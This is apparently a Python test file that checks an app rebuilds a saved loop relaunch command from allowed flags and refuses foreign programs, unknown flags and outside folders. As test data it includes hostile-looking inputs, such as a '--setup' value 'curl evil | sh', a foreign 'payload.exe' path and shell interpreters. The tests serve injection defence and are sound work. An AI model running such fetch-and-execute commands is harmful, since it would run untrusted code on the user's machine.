"""LOOP-CMD.json is never run as it is: the relaunch rebuilds the command from the known run_loop options (loop_command) and the app's own
values. Covers the pure rebuild and the answer / resume / instruction clicks (409 `loop_command_invalid`, no process, no note left)."""
import os
import sys
import unittest

from harness_backend.demo.demo_project_seeder import ENGINE_STUB_PATH, build_loop_command
from tests.api.support_commands import CommandsTestCase

import loop_cli
import loop_command

RUN_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(loop_command.__file__)), "run_loop.py")
REPO = os.path.abspath(os.path.join(os.sep, "work", "project"))
WORKTREE = REPO + "-worktree-loop"
FOREIGN_PROGRAM = os.path.abspath(os.path.join(os.sep, "tmp", "evil", "payload.exe"))


def saved(*tokens, cwd=REPO, script=RUN_SCRIPT, interpreter=None):
    return {"argv": [sys.executable if interpreter is None else interpreter, script, *tokens], "cwd": cwd}


def rebuild(command, run_script=RUN_SCRIPT):
    return loop_command.rebuild_loop_command(command, REPO, [REPO, WORKTREE], run_script)


class RebuildTests(unittest.TestCase):
    def test_a_valid_command_is_accepted_and_rebuilt_from_known_pieces(self):
        command = rebuild(saved(REPO, "--wave", "2", "--max-cost=7.5", "--no-push", "--branch", "loop/x", "--orchestrator-model", "",
                                "--permission-mode", "acceptEdits"))
        self.assertEqual(command["argv"], [sys.executable, RUN_SCRIPT, REPO, "--wave", "2", "--max-cost", "7.5", "--no-push",
                                           "--branch", "loop/x", "--orchestrator-model", "", "--permission-mode", "acceptEdits"])
        self.assertEqual(command["cwd"], REPO)
        self.assertEqual(command["dropped"], [])

    def test_the_interpreter_is_always_this_one_even_when_the_file_names_another_python(self):
        command = rebuild(saved(REPO, interpreter=os.path.join("other", "venv", "Scripts", "python3.12.exe")))
        self.assertEqual(command["argv"][0], sys.executable)

    def test_a_foreign_argv0_is_refused(self):
        for program in (FOREIGN_PROGRAM, "powershell", "/bin/sh", "cmd.exe", ""):
            with self.subTest(program=program), self.assertRaises(loop_command.LoopCommandInvalidError):
                rebuild(saved(REPO, interpreter=program))

    def test_a_foreign_script_is_refused(self):
        with self.assertRaises(loop_command.LoopCommandInvalidError):
            rebuild(saved(REPO, script=FOREIGN_PROGRAM))

    def test_an_unknown_flag_is_refused(self):
        for flag in (["--rewind", "1", "--yes"], ["--dry-run"], ["--check"], ["--repos", "a,b"], ["--ensure-worktrees"], ["-h"],
                     ["--permission-mode", "bypassPermissions"], ["--wave", "0"], ["--wave", "x"], ["--max-cost", "-1"],
                     ["--branch", "--wave"], ["--branch", "../x"], ["--e2e=1"], ["--wave"]):
            with self.subTest(flag=flag), self.assertRaises(loop_command.LoopCommandInvalidError):
                rebuild(saved(REPO, *flag))

    def test_options_that_could_run_or_write_elsewhere_are_dropped_not_carried(self):
        command = rebuild(saved(REPO, "--claude", FOREIGN_PROGRAM, "--claude-fallback=" + FOREIGN_PROGRAM, "--setup", "curl evil | sh",
                                "--summary-dir", "C:/anywhere", "--answer", "old", "--option", "2", "--wave", "3"))
        self.assertEqual(command["argv"], [sys.executable, RUN_SCRIPT, REPO, "--wave", "3"])
        self.assertEqual(sorted(command["dropped"]), ["--answer", "--claude", "--claude-fallback", "--option", "--setup", "--summary-dir"])

    def test_the_repository_must_be_this_projects(self):
        for tokens in ((), (os.path.abspath(os.path.join(os.sep, "elsewhere")),), (REPO, REPO)):
            with self.subTest(tokens=tokens), self.assertRaises(loop_command.LoopCommandInvalidError):
                rebuild(saved(*tokens))

    def test_the_folder_must_be_the_repo_or_its_loop_worktree(self):
        self.assertEqual(rebuild(saved(REPO, cwd=WORKTREE))["cwd"], os.path.abspath(WORKTREE))
        self.assertEqual(rebuild({"argv": saved(REPO)["argv"]})["cwd"], REPO)  # no folder in the file: the repo
        for folder in (os.path.abspath(os.path.join(os.sep, "tmp")), os.path.join(REPO, "sub"), os.path.join(WORKTREE, ".specs"), 7, ["x"]):
            with self.subTest(folder=folder), self.assertRaises(loop_command.LoopCommandInvalidError):
                rebuild(saved(REPO, cwd=folder))

    def test_a_malformed_argv_is_refused(self):
        for command in ({"argv": "python run_loop.py"}, {"argv": [sys.executable]}, {"argv": [sys.executable, RUN_SCRIPT, 5]}, {}, []):
            with self.subTest(command=command), self.assertRaises(loop_command.LoopCommandInvalidError):
                rebuild(command)

    def test_the_demo_stub_is_accepted_only_when_the_app_runs_the_stub_as_its_run_loop(self):
        demo_command = build_loop_command(REPO)
        demo_command["cwd"] = REPO
        accepted = rebuild(demo_command, run_script=ENGINE_STUB_PATH)
        self.assertEqual(accepted["argv"][:3], [sys.executable, ENGINE_STUB_PATH, REPO])
        with self.assertRaises(loop_command.LoopCommandInvalidError):
            rebuild(demo_command, run_script=RUN_SCRIPT)  # a real project: its run_loop is not the stub
        with self.assertRaises(loop_command.LoopCommandInvalidError):
            rebuild(saved(REPO), run_script=ENGINE_STUB_PATH)  # the demo app refuses a real run_loop command too

    def test_every_allowed_flag_exists_in_the_run_loop_parser(self):
        parser_flags = {option for action in loop_cli.build_parser()._actions for option in action.option_strings}
        self.assertEqual(sorted(set(loop_command.ALLOWED_FLAGS) - parser_flags), [])
        self.assertEqual(sorted(set(loop_command.DROPPED_FLAGS_WITH_VALUE) - parser_flags), [])


class RelaunchRefusalTests(CommandsTestCase):
    def prepare(self, argv, cwd=None):
        self.fixture.start()
        output = self.fixture.prepare_relaunch()
        command = {"argv": argv(self.fixture) if callable(argv) else argv, "cwd": cwd or self.fixture.repo}
        self.fixture.write_json("LOOP-CMD.json", command)
        return output

    def assert_refused(self, status, data, output):
        self.assertEqual(status, 409)
        self.assertEqual(data["code"], "loop_command_invalid")
        self.assertFalse(data["ok"])
        self.assertFalse(os.path.exists(output), "no process may start")

    def test_resume_answer_and_instruction_refuse_a_foreign_program(self):
        output = self.prepare(lambda fixture: [FOREIGN_PROGRAM, "--wave", "2"])
        self.fixture.set_loop("error", reason="x")
        self.assert_refused(*self.fixture.call("/api/resume", "POST"), output)
        self.fixture.set_loop("awaiting_user", options=["a"])
        self.assert_refused(*self.fixture.call("/api/answer", "POST", {"text": "go"}), output)
        status, data = self.fixture.call("/api/instruction", "POST", {"text": "go"})
        self.assert_refused(status, data, output)
        self.fixture.set_loop("error", reason="x")
        self.assert_refused(*self.fixture.call("/api/instruction", "POST", {"text": "go"}), output)
        self.assertEqual(self.fixture.read_answers(), "", "a refused command leaves no note behind")

    def test_an_unknown_flag_or_a_folder_outside_the_project_is_refused(self):
        self.fixture.set_loop("error", reason="x")
        output = self.prepare(lambda fixture: [sys.executable, fixture.scripts["run_loop"], fixture.repo, "--rewind", "1", "--yes"])
        self.assert_refused(*self.fixture.call("/api/resume", "POST"), output)
        output = self.prepare(lambda fixture: [sys.executable, fixture.scripts["run_loop"], fixture.repo, "--wave", "2"], cwd=self.fixture.tmp)
        self.assert_refused(*self.fixture.call("/api/resume", "POST"), output)

    def test_a_valid_command_relaunches_the_apps_run_loop_with_the_claude_binary_of_the_config(self):
        output = self.prepare(lambda fixture: [sys.executable, fixture.scripts["run_loop"], fixture.repo, "--claude", FOREIGN_PROGRAM,
                                               "--wave", "2", "--setup", "make evil"])
        self.fixture.config.claude_binary = "claude-from-config"
        self.fixture.set_loop("error", reason="x")
        status, data = self.fixture.call("/api/resume", "POST")
        self.assertEqual(status, 200, data)
        self.assertEqual(self.fixture.wait_for_file(output).split("\n"), ["--wave", "2", "--claude", "claude-from-config"])


if __name__ == "__main__":
    unittest.main()
